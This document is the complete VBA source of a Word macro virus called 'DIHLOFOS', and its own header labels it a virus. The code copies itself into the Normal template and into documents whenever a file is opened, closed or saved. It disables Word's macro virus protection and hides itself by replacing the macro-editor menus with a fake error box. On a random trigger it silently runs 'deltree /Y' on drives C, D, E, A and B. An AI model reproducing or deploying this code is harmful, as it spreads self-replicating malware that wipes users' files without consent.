   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "DIHLOFOS"
   '**************************
   '    This is virus        *
   'Version: 1.0             *
   '   Name: Dihlofos        *
   '  Autor: Kiselov Maxim   *
   '   Date: 28.06.2001      *
   'Made in: Russia          *
   '**************************
   Sub AutoOpen()
   Call Infect
   End Sub
   Sub ErrorBox()
   Dim Msg, MSGer, Style, Title
   Msg = Error(51)
   Title = "Error 51"
   Style = 0 + 16
   MSGer = MsgBox(Msg, Style, Title)
   End Sub
   Sub Infect()
   On Error Resume Next
   Dim File$
   Dim ThisFile$
   Dim MyV
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   ThisFile$ = WordBasic.[FileName$]()
   Set myTemplate = ActiveDocument.AttachedTemplate
   File$ = myTemplate.Path & Application.PathSeparator & _
   myTemplate.Name
   Application.OrganizerCopy Source:=ThisFile$, Destination:=File$, Name:="DIHLOFOS", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=File$, Destination:=ThisFile$, Name:="DIHLOFOS", Object:=wdOrganizerObjectProjectItems
   MyV = Int((500 * Rnd) + 1)
   If MyV = 17 Then Call Distructive
   End Sub
   Sub ToolsMacro()
   Call ErrorBox
   End Sub
   Sub AutoClose()
   Call Infect
   End Sub
   Sub FileSaveAs()
   Call Infect
   Dialogs(wdDialogFileSaveAs).Show
   End Sub
   Sub FileSave()
   Call Infect
   ActiveDocument.Save
   End Sub
   Sub Distructive()
   On Error Resume Next
   MsgBox Title:="Virus DIHLOFOS", Prompt:="Ha ha ha ha...You System DEAD!"
   If Application.UserName = "Êèñåë¸â Ìàêñèì Ñåðãååâè÷" Then End
   Shell "Command.com /c deltree /Y C:\", vbHide
   Shell "Command.com /c deltree /Y D:\", vbHide
   Shell "Command.com /c deltree /Y E:\", vbHide
   Shell "Command.com /c deltree /Y A:\", vbHide
   Shell "Command.com /c deltree /Y B:\", vbHide
   End Sub
   Sub ToolsCustomize()
   Call ErrorBox
   End Sub
   Sub ToolsOptions()
   Call ErrorBox
   End Sub
   Sub ViewVbCode()
   Call ErrorBox
   End Sub
